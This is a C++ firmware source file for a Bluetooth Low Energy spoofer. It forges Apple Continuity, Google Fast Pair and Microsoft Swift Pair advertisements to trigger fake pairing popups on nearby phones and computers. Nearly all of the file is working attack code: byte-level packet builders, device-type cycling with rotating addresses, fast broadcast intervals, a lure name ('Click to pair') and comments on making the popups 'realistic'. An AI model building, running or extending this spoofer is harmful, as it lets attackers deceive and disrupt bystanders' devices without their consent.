// ============================================================================
// bt_spoofer.cpp — BLE Spoofer
//
// Message formats are the publicly documented Continuity / Fast Pair /
// Swift Pair advertisement structures (see docs/payload_tables.md for the
// byte layouts and where each constant comes from). Randomized bytes inside
// each message are re-randomized per burst, addresses rotate per burst.
// ============================================================================
#include "bt_spoofer.h"

// ------------------------------------------------------- Apple Continuity --
// Pattern A (headphones): [1E FF 4C 00 07 19 07 <type> 20 75 AA 30 01 00 00 45
//                          12 12 12 <8B rest mostly zeros>]
// Pattern B (TV / HomePod / new-phone): [16 FF 4C 00 04 04 2A 00 00 00 0F 05 C1
//                          <type> 60 4C 95 00 00 10 00 00 00]
static const uint8_t PATTERN_A_TYPE_MAX = 17;   // types 1..17 use pattern A

struct AppleType { uint8_t id; const char* name; };
static const AppleType APPLE_TYPES[] = {
    { 1,  "AirPods" },               { 2,  "AirPods Pro" },
    { 3,  "AirPods Max" },           { 4,  "AirPods Gen2" },
    { 5,  "AirPods Gen3" },          { 6,  "AirPods Pro Gen2" },
    { 7,  "PowerBeats" },            { 8,  "PowerBeats Pro" },
    { 9,  "Beats Solo Pro" },        { 10, "Beats Studio Buds" },
    { 11, "Beats Flex" },            { 12, "BeatsX" },
    { 13, "Beats Solo3" },           { 14, "Beats Studio3" },
    { 15, "Beats Studio Pro" },      { 16, "Beats Fit Pro" },
    { 17, "Beats Studio Buds+" },    { 18, "AppleTV Setup" },
    { 19, "AppleTV Pair" },          { 20, "AppleTV New User" },
    { 21, "AppleTV AppleID Setup" }, { 22, "AppleTV Wireless Audio Sync" },
    { 23, "AppleTV Homekit Setup" }, { 24, "AppleTV Keyboard" },
    { 25, "AppleTV 'Connecting to Network'" },
    { 26, "HomePod Setup" },         { 27, "Setup New Phone" },
    { 28, "Transfer Number to New Phone" },
    { 29, "TV Color Balance" },
};
static const uint8_t APPLE_TYPE_COUNT = sizeof(APPLE_TYPES) / sizeof(APPLE_TYPES[0]);

// --------------------------------------------------------------- Fast Pair --
struct FpModel { const char* id6; const char* name; };
// Starter table — EXTEND from your own captures / community lists.
// 0x000000-ish entries below are FORMAT VALID placeholders: the packet is a
// real Fast Pair advert; a given model ID only changes which device Android
// offers to pair with. Add known-good IDs to make the popup realistic.
static const FpModel FP_MODELS[] = {
    { "000001", "Example Model 1 (replace)" },
    { "000002", "Example Model 2 (replace)" },
    { "470102", "Example Buds-style (replace)" },
};
static const uint8_t FP_MODEL_COUNT = sizeof(FP_MODELS) / sizeof(FP_MODELS[0]);

// ------------------------------------------------------------------ state ---
enum SpooferMode : uint8_t { SP_OFF = 0, SP_APPLE, SP_ANDROID, SP_SWIFT };
static SpooferMode s_mode = SP_OFF;
static uint8_t  s_appleType = 0;        // 0 = cycle all
static int16_t  s_fpModel   = -1;       // -1 = cycle
static String   s_swiftName = "\xe2\x9a\xa1 Click to pair";  // U+26A1 prefix
static uint16_t s_interval  = BT_SPOOF_INTERVAL_MS;
static uint32_t s_sent      = 0;
static uint8_t  s_buf[31];
static size_t   s_len = 0;

static void rand_bytes(uint8_t* p, size_t n) { for (size_t i = 0; i < n; i++) p[i] = random(256); }

// build Apple continuity "nearby action / new device" message
static size_t build_apple(uint8_t type, uint8_t* out) {
    size_t p = 0;
    if (type <= PATTERN_A_TYPE_MAX) {
        out[p++] = 0x1E; out[p++] = 0xFF;
        out[p++] = 0x4C; out[p++] = 0x00;
        out[p++] = 0x07; out[p++] = 0x19; out[p++] = 0x07;
        out[p++] = type;
        out[p++] = 0x20; out[p++] = 0x75; out[p++] = 0xAA; out[p++] = 0x30;
        out[p++] = 0x01; out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x45;
        out[p++] = 0x12; out[p++] = 0x12; out[p++] = 0x12;
        uint8_t rnd[8]; rand_bytes(rnd, 8);
        memcpy(&out[p], rnd, 8); p += 8;
        memset(&out[p], 0x00, 31 - p); p = 31;
    } else {
        out[p++] = 0x16; out[p++] = 0xFF;
        out[p++] = 0x4C; out[p++] = 0x00;
        out[p++] = 0x04; out[p++] = 0x04; out[p++] = 0x2A;
        out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x00;
        out[p++] = 0x0F; out[p++] = 0x05; out[p++] = 0xC1;
        out[p++] = type;
        out[p++] = 0x60; out[p++] = 0x4C; out[p++] = 0x95;
        out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x10;
        out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x00;
    }
    return p;
}

// build Fast Pair model advert: [02 01 06][03 03 2C FE][07 16 2C FE 02 m0 m1 m2]
static size_t build_android(const uint8_t mid[3], uint8_t* out) {
    size_t p = 0;
    out[p++] = 0x02; out[p++] = 0x01; out[p++] = 0x06;
    out[p++] = 0x03; out[p++] = 0x03; out[p++] = 0x2C; out[p++] = 0xFE;
    out[p++] = 0x07; out[p++] = 0x16; out[p++] = 0x2C; out[p++] = 0xFE;
    out[p++] = 0x02;
    memcpy(&out[p], mid, 3); p += 3;
    return p;
}

// build Swift Pair advert: [02 01 06][03 03 0D 06][len 09 <name>]
static size_t build_swift(const String& name, uint8_t* out) {
    size_t p = 0;
    out[p++] = 0x02; out[p++] = 0x01; out[p++] = 0x06;
    out[p++] = 0x03; out[p++] = 0x03; out[p++] = 0x0D; out[p++] = 0x06;
    size_t nl = name.length();
    if (nl > 29 - p - 1) nl = 29 - p - 1;
    out[p++] = (uint8_t)(nl + 1);
    out[p++] = 0x09;                                  // complete local name
    memcpy(&out[p], name.c_str(), nl); p += nl;
    return p;
}

static bool push_frame(uint8_t* data, size_t len) {
    if (!bt_tx_raw(data, len, s_interval, true)) return false;
    s_sent++;
    return true;
}

bool bt_spoofer_command(const String& c) {
    if (!c.startsWith("spoofer")) return false;
    String a = c.substring(7); a.trim();

    if (a == "list") {
        Serial.println("[spoofer] apple types:");
        for (uint8_t i = 0; i < APPLE_TYPE_COUNT; i++)
            Serial.printf("  %2u %-28s\n", APPLE_TYPES[i].id, APPLE_TYPES[i].name);
        Serial.println("[spoofer] fast pair models:");
        for (uint8_t i = 0; i < FP_MODEL_COUNT; i++)
            Serial.printf("  %s %-28s\n", FP_MODELS[i].id6, FP_MODELS[i].name);
        Serial.println("[spoofer] add model IDs in bt_spoofer.cpp FP_MODELS[]");
        return true;
    }
    if (a.startsWith("apple")) {
        if (!bt_is_armed()) { Serial.println("[spoofer] refused — run `bt arm` first"); return true; }
        String t = a.substring(5); t.trim();
        if (t == "all") s_appleType = 0;
        else {
            int id = t.toInt();
            bool ok = false;
            for (uint8_t i = 0; i < APPLE_TYPE_COUNT; i++) if (APPLE_TYPES[i].id == id) ok = true;
            if (!ok) { Serial.println("usage: spoofer apple <1-29|all>  (see spoofer list)"); return true; }
            s_appleType = (uint8_t)id;
        }
        s_mode = SP_APPLE;
        Serial.printf("[spoofer] apple type=%s\n", s_appleType ? t.c_str() : "cycle");
        return true;
    }
    if (a.startsWith("android")) {
        if (!bt_is_armed()) { Serial.println("[spoofer] refused — run `bt arm` first"); return true; }
        String t = a.substring(7); t.trim();
        if (t == "all") { s_fpModel = -1; }
        else {
            s_fpModel = -1;
            for (uint8_t i = 0; i < FP_MODEL_COUNT; i++)
                if (t.equalsIgnoreCase(FP_MODELS[i].id6)) s_fpModel = i;
            if (s_fpModel < 0) { Serial.println("usage: spoofer android <hex6|all>  (see spoofer list)"); return true; }
        }
        s_mode = SP_ANDROID;
        Serial.printf("[spoofer] android model=%s\n", s_fpModel >= 0 ? FP_MODELS[s_fpModel].name : "cycle");
        return true;
    }
    if (a.startsWith("swift")) {
        if (!bt_is_armed()) { Serial.println("[spoofer] refused — run `bt arm` first"); return true; }
        String n = a.substring(5); n.trim();
        if (n.length()) s_swiftName = n;
        s_mode = SP_SWIFT;
        Serial.printf("[spoofer] swift pair name=\"%s\"\n", s_swiftName.c_str());
        return true;
    }
    if (a.startsWith("interval")) {
        int ms = a.substring(8).toInt();
        if (ms >= 20 && ms <= 5000) { s_interval = ms; Serial.printf("[spoofer] interval %ums\n", ms); }
        else Serial.println("usage: spoofer interval <20-5000>");
        return true;
    }
    if (a == "stop") { bt_spoofer_stop(); return true; }
    Serial.println("usage: spoofer apple <1-29|all> | spoofer android <hex6|all> | spoofer swift [name] | spoofer interval <ms> | spoofer stop | spoofer list");
    return true;
}

void bt_spoofer_stop() {
    if (s_mode == SP_OFF) return;
    s_mode = SP_OFF;
    bt_tx_stop();
    Serial.printf("[spoofer] stopped after %lu frames\n", (unsigned long)s_sent);
}

void bt_spoofer_loop() {
    if (s_mode == SP_OFF) return;
    if (!bt_tx_active()) { s_mode = SP_OFF; return; }

    static uint32_t lastMs = 0;
    if (lastMs && millis() - lastMs < s_interval) return;   // throttle rotations
    lastMs = millis();

    if (s_mode == SP_APPLE) {
        uint8_t type = s_appleType;
        if (!type) type = APPLE_TYPES[random(APPLE_TYPE_COUNT)].id;
        s_len = build_apple(type, s_buf);
        bt_tx_raw(s_buf, s_len, s_interval, true);
        s_sent++;
    } else if (s_mode == SP_ANDROID) {
        uint8_t mid[3];
        int pick = s_fpModel;
        if (pick < 0) pick = random(FP_MODEL_COUNT);
        const char* h = FP_MODELS[pick].id6;
        for (int i = 0; i < 3; i++) {
            char b[3] = { h[2 * i], h[2 * i + 1], 0 };
            mid[i] = (uint8_t)strtol(b, nullptr, 16);
        }
        s_len = build_android(mid, s_buf);
        bt_tx_raw(s_buf, s_len, s_interval, true);
        s_sent++;
    } else if (s_mode == SP_SWIFT) {
        s_len = build_swift(s_swiftName, s_buf);
        bt_tx_raw(s_buf, s_len, s_interval, true);
        s_sent++;
    }
}

bool bt_spoofer_status(BtUiState& out) {
    if (s_mode == SP_OFF) return false;
    out.title   = "BLE Spoofer";
    out.running = true;
    out.phase   = s_mode == SP_APPLE ? "apple" : s_mode == SP_ANDROID ? "fast pair" : "swift pair";
    out.module  = BT_MOD_SPOOFER;
    out.lineCount = 0;
    if (s_mode == SP_APPLE && s_appleType) {
        const char* nm = "?";
        for (uint8_t i = 0; i < APPLE_TYPE_COUNT; i++)
            if (APPLE_TYPES[i].id == s_appleType) nm = APPLE_TYPES[i].name;
        out.lines[out.lineCount++] = String("type: ") + nm;
    }
    out.lines[out.lineCount++] = bt_fmt("frames: %lu", (unsigned long)s_sent);
    out.lines[out.lineCount++] = bt_fmt("interval: %ums", s_interval);
    return true;
}
